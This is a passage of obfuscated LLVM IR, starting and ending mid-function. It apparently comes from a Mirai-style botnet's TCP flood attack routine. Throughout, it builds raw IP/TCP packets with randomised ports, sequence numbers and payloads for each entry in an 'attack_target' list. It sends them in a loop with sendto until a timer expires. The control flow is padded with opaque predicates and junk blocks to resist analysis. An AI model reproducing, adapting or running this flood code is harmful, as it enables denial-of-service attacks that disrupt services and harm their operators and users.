
originalBB:                                       ; preds = %originalBBalteredBB, %125
  store i32 0, i32* %11, align 4
  %134 = load i32, i32* @x.25
  %135 = load i32, i32* @y.26
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %142

; <label>:142:                                    ; preds = %originalBBpart231, %originalBBpart2
  %143 = load i32, i32* %11, align 4
  %144 = load i8, i8* %7, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp slt i32 %143, %145
  br i1 %146, label %147, label %340

; <label>:147:                                    ; preds = %142
  %148 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %149 = load i8**, i8*** %13, align 8
  %150 = load i32, i32* %11, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds i8*, i8** %149, i64 %151
  store i8* %148, i8** %152, align 8
  %153 = load i8**, i8*** %13, align 8
  %154 = load i32, i32* %11, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds i8*, i8** %153, i64 %155
  %157 = load i8*, i8** %156, align 8
  %158 = bitcast i8* %157 to %struct.iphdr*
  store %struct.iphdr* %158, %struct.iphdr** %32, align 8
  %159 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1
  %161 = bitcast %struct.iphdr* %160 to %struct.tcphdr*
  store %struct.tcphdr* %161, %struct.tcphdr** %33, align 8
  %162 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %163 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %162, i64 1
  %164 = bitcast %struct.tcphdr* %163 to i8*
  store i8* %164, i8** %34, align 8
  %165 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %166 = bitcast %struct.iphdr* %165 to i8*
  %167 = load i8, i8* %166, align 4
  %168 = and i8 %167, 15
  %169 = or i8 %168, 64
  store i8 %169, i8* %166, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %171 = bitcast %struct.iphdr* %170 to i8*
  %172 = load i8, i8* %171, align 4
  %173 = and i8 %172, -16
  %174 = or i8 %173, 5
  store i8 %174, i8* %171, align 4
  %175 = load i8, i8* %14, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 1
  store i8 %175, i8* %177, align 1
  %178 = load i32, i32* %28, align 4
  %179 = sext i32 %178 to i64
  %180 = add i64 40, %179
  %181 = trunc i64 %180 to i16
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 2
  store i16 %182, i16* %184, align 2
  %185 = load i16, i16* %15, align 2
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 3
  store i16 %186, i16* %188, align 4
  %189 = load i8, i8* %16, align 1
  %190 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 5
  store i8 %189, i8* %191, align 4
  %192 = load i8, i8* %17, align 1
  %193 = icmp ne i8 %192, 0
  br i1 %193, label %194, label %198

; <label>:194:                                    ; preds = %147
  %195 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %196 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 4
  store i16 %195, i16* %197, align 2
  br label %198

; <label>:198:                                    ; preds = %194, %147
  %199 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 6
  store i8 6, i8* %200, align 1
  %201 = load i32, i32* %30, align 4
  %202 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 8
  store i32 %201, i32* %203, align 4
  %204 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %205 = load i32, i32* %11, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 1
  %209 = load i32, i32* %208, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 9
  store i32 %209, i32* %211, align 4
  %212 = load i16, i16* %18, align 2
  %213 = call zeroext i16 @htons(i16 zeroext %212) #7
  %214 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  store i16 %213, i16* %215, align 4
  %216 = load i16, i16* %19, align 2
  %217 = call zeroext i16 @htons(i16 zeroext %216) #7
  %218 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 1
  store i16 %217, i16* %219, align 2
  %220 = load i32, i32* %20, align 4
  %221 = trunc i32 %220 to i16
  %222 = call zeroext i16 @htons(i16 zeroext %221) #7
  %223 = zext i16 %222 to i32
  %224 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 2
  store i32 %223, i32* %225, align 4
  %226 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %228, -241
  %230 = or i16 %229, 80
  store i16 %230, i16* %227, align 4
  %231 = load i8, i8* %22, align 1
  %232 = sext i8 %231 to i16
  %233 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 4
  %235 = load i16, i16* %234, align 4
  %236 = and i16 %232, 1
  %237 = shl i16 %236, 13
  %238 = and i16 %235, -8193
  %239 = or i16 %238, %237
  store i16 %239, i16* %234, align 4
  %240 = load i8, i8* %23, align 1
  %241 = sext i8 %240 to i16
  %242 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 4
  %244 = load i16, i16* %243, align 4
  %245 = and i16 %241, 1
  %246 = shl i16 %245, 12
  %247 = and i16 %244, -4097
  %248 = or i16 %247, %246
  store i16 %248, i16* %243, align 4
  %249 = load i8, i8* %24, align 1
  %250 = sext i8 %249 to i16
  %251 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 4
  %253 = load i16, i16* %252, align 4
  %254 = and i16 %250, 1
  %255 = shl i16 %254, 11
  %256 = and i16 %253, -2049
  %257 = or i16 %256, %255
  store i16 %257, i16* %252, align 4
  %258 = load i8, i8* %25, align 1
  %259 = sext i8 %258 to i16
  %260 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = and i16 %259, 1
  %264 = shl i16 %263, 10
  %265 = and i16 %262, -1025
  %266 = or i16 %265, %264
  store i16 %266, i16* %261, align 4
  %267 = load i8, i8* %26, align 1
  %268 = sext i8 %267 to i16
  %269 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = and i16 %268, 1
  %273 = shl i16 %272, 9
  %274 = and i16 %271, -513
  %275 = or i16 %274, %273
  store i16 %275, i16* %270, align 4
  %276 = load i8, i8* %27, align 1
  %277 = sext i8 %276 to i16
  %278 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 4
  %280 = load i16, i16* %279, align 4
  %281 = and i16 %277, 1
  %282 = shl i16 %281, 8
  %283 = and i16 %280, -257
  %284 = or i16 %283, %282
  store i16 %284, i16* %279, align 4
  %285 = call i32 @rand_next()
  %286 = and i32 %285, 65535
  %287 = trunc i32 %286 to i16
  %288 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %289 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %288, i32 0, i32 5
  store i16 %287, i16* %289, align 2
  %290 = load i8, i8* %24, align 1
  %291 = icmp ne i8 %290, 0
  br i1 %291, label %292, label %314

; <label>:292:                                    ; preds = %198
  %293 = load i32, i32* @x.25
  %294 = load i32, i32* @y.26
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %292
  %301 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 4
  %303 = load i16, i16* %302, align 4
  %304 = and i16 %303, -2049
  %305 = or i16 %304, 2048
  store i16 %305, i16* %302, align 4
  %306 = load i32, i32* @x.25
  %307 = load i32, i32* @y.26
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBBpart217, label %originalBB1alteredBB

originalBBpart217:                                ; preds = %originalBB1
  br label %314

; <label>:314:                                    ; preds = %originalBBpart217, %198
  %315 = load i8*, i8** %34, align 8
  %316 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %315, i32 %316)
  %317 = load i8*, i8** %34, align 8
  %318 = load i32, i32* %28, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds i8, i8* %317, i64 %319
  store i8 0, i8* %320, align 1
  br label %321

; <label>:321:                                    ; preds = %314
  %322 = load i32, i32* @x.25
  %323 = load i32, i32* @y.26
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %321
  %330 = load i32, i32* %11, align 4
  %331 = add nsw i32 %330, 1
  store i32 %331, i32* %11, align 4
  %332 = load i32, i32* @x.25
  %333 = load i32, i32* @y.26
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart231, label %originalBB19alteredBB

originalBBpart231:                                ; preds = %originalBB19
  br label %142

; <label>:340:                                    ; preds = %142
  br label %341

; <label>:341:                                    ; preds = %637, %340
  store i32 0, i32* %11, align 4
  br label %342

; <label>:342:                                    ; preds = %originalBBpart271, %341
  %343 = load i32, i32* %11, align 4
  %344 = load i8, i8* %7, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp slt i32 %343, %345
  br i1 %346, label %347, label %615

; <label>:347:                                    ; preds = %342
  %348 = load i32, i32* @x.25
  %349 = load i32, i32* @y.26
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %347
  %356 = load i8**, i8*** %13, align 8
  %357 = load i32, i32* %11, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds i8*, i8** %356, i64 %358
  %360 = load i8*, i8** %359, align 8
  store i8* %360, i8** %35, align 8
  %361 = load i8*, i8** %35, align 8
  %362 = bitcast i8* %361 to %struct.iphdr*
  store %struct.iphdr* %362, %struct.iphdr** %36, align 8
  %363 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i64 1
  %365 = bitcast %struct.iphdr* %364 to %struct.tcphdr*
  store %struct.tcphdr* %365, %struct.tcphdr** %37, align 8
  %366 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i64 1
  %368 = bitcast %struct.tcphdr* %367 to i8*
  store i8* %368, i8** %38, align 8
  %369 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %370 = load i32, i32* %11, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %369, i64 %371
  %373 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %372, i32 0, i32 2
  %374 = load i8, i8* %373, align 4
  %375 = zext i8 %374 to i32
  %376 = icmp slt i32 %375, 32
  %377 = load i32, i32* @x.25
  %378 = load i32, i32* @y.26
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %376, label %385, label %406

; <label>:385:                                    ; preds = %originalBBpart235
  %386 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %387 = load i32, i32* %11, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %386, i64 %388
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %389, i32 0, i32 1
  %391 = load i32, i32* %390, align 4
  %392 = call i32 @ntohl(i32 %391) #7
  %393 = call i32 @rand_next()
  %394 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %395 = load i32, i32* %11, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %394, i64 %396
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %397, i32 0, i32 2
  %399 = load i8, i8* %398, align 4
  %400 = zext i8 %399 to i32
  %401 = lshr i32 %393, %400
  %402 = add i32 %392, %401
  %403 = call i32 @htonl(i32 %402) #7
  %404 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 9
  store i32 %403, i32* %405, align 4
  br label %406

; <label>:406:                                    ; preds = %385, %originalBBpart235
  %407 = load i32, i32* @x.25
  %408 = load i32, i32* @y.26
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %406
  %415 = load i32, i32* %30, align 4
  %416 = icmp eq i32 %415, -1
  %417 = load i32, i32* @x.25
  %418 = load i32, i32* @y.26
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %416, label %425, label %445

; <label>:425:                                    ; preds = %originalBBpart239
  %426 = load i32, i32* @x.25
  %427 = load i32, i32* @y.26
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %425
  %434 = call i32 @rand_next()
  %435 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 8
  store i32 %434, i32* %436, align 4
  %437 = load i32, i32* @x.25
  %438 = load i32, i32* @y.26
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %445

; <label>:445:                                    ; preds = %originalBBpart243, %originalBBpart239
  %446 = load i16, i16* %15, align 2
  %447 = zext i16 %446 to i32
  %448 = icmp eq i32 %447, 65535
  br i1 %448, label %449, label %455

; <label>:449:                                    ; preds = %445
  %450 = call i32 @rand_next()
  %451 = and i32 %450, 65535
  %452 = trunc i32 %451 to i16
  %453 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %454 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %453, i32 0, i32 3
  store i16 %452, i16* %454, align 4
  br label %455

; <label>:455:                                    ; preds = %449, %445
  %456 = load i32, i32* @x.25
  %457 = load i32, i32* @y.26
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %455
  %464 = load i16, i16* %18, align 2
  %465 = zext i16 %464 to i32
  %466 = icmp eq i32 %465, 65535
  %467 = load i32, i32* @x.25
  %468 = load i32, i32* @y.26
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %466, label %475, label %481

; <label>:475:                                    ; preds = %originalBBpart247
  %476 = call i32 @rand_next()
  %477 = and i32 %476, 65535
  %478 = trunc i32 %477 to i16
  %479 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %480 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %479, i32 0, i32 0
  store i16 %478, i16* %480, align 4
  br label %481

; <label>:481:                                    ; preds = %475, %originalBBpart247
  %482 = load i16, i16* %19, align 2
  %483 = zext i16 %482 to i32
  %484 = icmp eq i32 %483, 65535
  br i1 %484, label %485, label %491

; <label>:485:                                    ; preds = %481
  %486 = call i32 @rand_next()
  %487 = and i32 %486, 65535
  %488 = trunc i32 %487 to i16
  %489 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 1
  store i16 %488, i16* %490, align 2
  br label %491

; <label>:491:                                    ; preds = %485, %481
  %492 = load i32, i32* @x.25
  %493 = load i32, i32* @y.26
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %491
  %500 = load i32, i32* %20, align 4
  %501 = icmp eq i32 %500, 65535
  %502 = load i32, i32* @x.25
  %503 = load i32, i32* @y.26
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %501, label %510, label %530

; <label>:510:                                    ; preds = %originalBBpart251
  %511 = load i32, i32* @x.25
  %512 = load i32, i32* @y.26
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %510
  %519 = call i32 @rand_next()
  %520 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %521 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %520, i32 0, i32 2
  store i32 %519, i32* %521, align 4
  %522 = load i32, i32* @x.25
  %523 = load i32, i32* @y.26
  %524 = sub i32 %522, 1
  %525 = mul i32 %522, %524
  %526 = urem i32 %525, 2
  %527 = icmp eq i32 %526, 0
  %528 = icmp slt i32 %523, 10
  %529 = or i1 %527, %528
  br i1 %529, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %530

; <label>:530:                                    ; preds = %originalBBpart255, %originalBBpart251
  %531 = load i32, i32* %21, align 4
  %532 = icmp eq i32 %531, 65535
  br i1 %532, label %533, label %537

; <label>:533:                                    ; preds = %530
  %534 = call i32 @rand_next()
  %535 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %536 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %535, i32 0, i32 3
  store i32 %534, i32* %536, align 4
  br label %537

; <label>:537:                                    ; preds = %533, %530
  %538 = load i8, i8* %29, align 1
  %539 = icmp ne i8 %538, 0
  br i1 %539, label %540, label %547

; <label>:540:                                    ; preds = %537
  %541 = load i8*, i8** %38, align 8
  %542 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %541, i32 %542)
  %543 = load i8*, i8** %38, align 8
  %544 = load i32, i32* %28, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds i8, i8* %543, i64 %545
  store i8 0, i8* %546, align 1
  br label %547

; <label>:547:                                    ; preds = %540, %537
  %548 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i32 0, i32 7
  store i16 0, i16* %549, align 2
  %550 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %551 = bitcast %struct.iphdr* %550 to i16*
  %552 = call zeroext i16 @checksum_generic(i16* %551, i32 20)
  %553 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %554 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %553, i32 0, i32 7
  store i16 %552, i16* %554, align 2
  %555 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %556 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %555, i32 0, i32 6
  store i16 0, i16* %556, align 4
  %557 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %558 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %559 = bitcast %struct.tcphdr* %558 to i8*
  %560 = load i32, i32* %28, align 4
  %561 = sext i32 %560 to i64
  %562 = add i64 20, %561
  %563 = trunc i64 %562 to i16
  %564 = call zeroext i16 @htons(i16 zeroext %563) #7
  %565 = load i32, i32* %28, align 4
  %566 = sext i32 %565 to i64
  %567 = add i64 20, %566
  %568 = trunc i64 %567 to i32
  %569 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %557, i8* %559, i16 zeroext %564, i32 %568)
  %570 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 6
  store i16 %569, i16* %571, align 4
  %572 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %573 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %572, i32 0, i32 1
  %574 = load i16, i16* %573, align 2
  %575 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %576 = load i32, i32* %11, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %575, i64 %577
  %579 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %578, i32 0, i32 0
  %580 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %579, i32 0, i32 1
  store i16 %574, i16* %580, align 2
  %581 = load i32, i32* %12, align 4
  %582 = load i8*, i8** %35, align 8
  %583 = load i32, i32* %28, align 4
  %584 = sext i32 %583 to i64
  %585 = add i64 40, %584
  %586 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %587 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %588 = load i32, i32* %11, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i64 %589
  %591 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %590, i32 0, i32 0
  %592 = bitcast %struct.sockaddr_in* %591 to %struct.sockaddr*
  store %struct.sockaddr* %592, %struct.sockaddr** %586, align 8
  %593 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %594 = load %struct.sockaddr*, %struct.sockaddr** %593, align 8
  %595 = call i64 @sendto(i32 %581, i8* %582, i64 %585, i32 16384, %struct.sockaddr* %594, i32 16)
  br label %596

; <label>:596:                                    ; preds = %547
  %597 = load i32, i32* @x.25
  %598 = load i32, i32* @y.26
  %599 = sub i32 %597, 1
  %600 = mul i32 %597, %599
  %601 = urem i32 %600, 2
  %602 = icmp eq i32 %601, 0
  %603 = icmp slt i32 %598, 10
  %604 = or i1 %602, %603
  br i1 %604, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %596
  %605 = load i32, i32* %11, align 4
  %606 = add nsw i32 %605, 1
  store i32 %606, i32* %11, align 4
  %607 = load i32, i32* @x.25
  %608 = load i32, i32* @y.26
  %609 = sub i32 %607, 1
  %610 = mul i32 %607, %609
  %611 = urem i32 %610, 2
  %612 = icmp eq i32 %611, 0
  %613 = icmp slt i32 %608, 10
  %614 = or i1 %612, %613
  br i1 %614, label %originalBBpart271, label %originalBB57alteredBB

originalBBpart271:                                ; preds = %originalBB57
  br label %342

; <label>:615:                                    ; preds = %342
  %616 = load i32, i32* @x.25
  %617 = load i32, i32* @y.26
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %615
  %624 = call i64 @time(i64* null) #6
  %625 = load i32, i32* %31, align 4
  %626 = sext i32 %625 to i64
  %627 = icmp sgt i64 %624, %626
  %628 = load i32, i32* @x.25
  %629 = load i32, i32* @y.26
  %630 = sub i32 %628, 1
  %631 = mul i32 %628, %630
  %632 = urem i32 %631, 2
  %633 = icmp eq i32 %632, 0
  %634 = icmp slt i32 %629, 10
  %635 = or i1 %633, %634
  br i1 %635, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %627, label %636, label %637

; <label>:636:                                    ; preds = %originalBBpart275
  br label %638

; <label>:637:                                    ; preds = %originalBBpart275
  br label %341

; <label>:638:                                    ; preds = %636, %122, %116
  %639 = load i32, i32* @x.25
  %640 = load i32, i32* @y.26
  %641 = sub i32 %639, 1
  %642 = mul i32 %639, %641
  %643 = urem i32 %642, 2
  %644 = icmp eq i32 %643, 0
  %645 = icmp slt i32 %640, 10
  %646 = or i1 %644, %645
  br i1 %646, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %638
  %647 = load i32, i32* @x.25
  %648 = load i32, i32* @y.26
  %649 = sub i32 %647, 1
  %650 = mul i32 %647, %649
  %651 = urem i32 %650, 2
  %652 = icmp eq i32 %651, 0
  %653 = icmp slt i32 %648, 10
  %654 = or i1 %652, %653
  br i1 %654, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %125
  store i32 0, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %292
  %655 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %656 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %655, i32 0, i32 4
  %657 = load i16, i16* %656, align 4
  %_ = sub i16 %657, -2049
  %gen = mul i16 %_, -2049
  %_2 = shl i16 %657, -2049
  %_3 = shl i16 %657, -2049
  %_4 = sub i16 %657, -2049
  %gen5 = mul i16 %_4, -2049
  %_6 = sub i16 %657, -2049
  %gen7 = mul i16 %_6, -2049
  %_8 = sub i16 0, %657
  %gen9 = add i16 %_8, -2049
  %658 = and i16 %657, -2049
  %_10 = sub i16 0, %658
  %gen11 = add i16 %_10, 2048
  %_12 = sub i16 %658, 2048
  %gen13 = mul i16 %_12, 2048
  %_14 = sub i16 0, %658
  %gen15 = add i16 %_14, 2048
  %659 = or i16 %658, 2048
  store i16 %659, i16* %656, align 4
  br label %originalBB1

originalBB19alteredBB:                            ; preds = %originalBB19, %321
  %660 = load i32, i32* %11, align 4
  %_20 = sub i32 %660, 1
  %gen21 = mul i32 %_20, 1
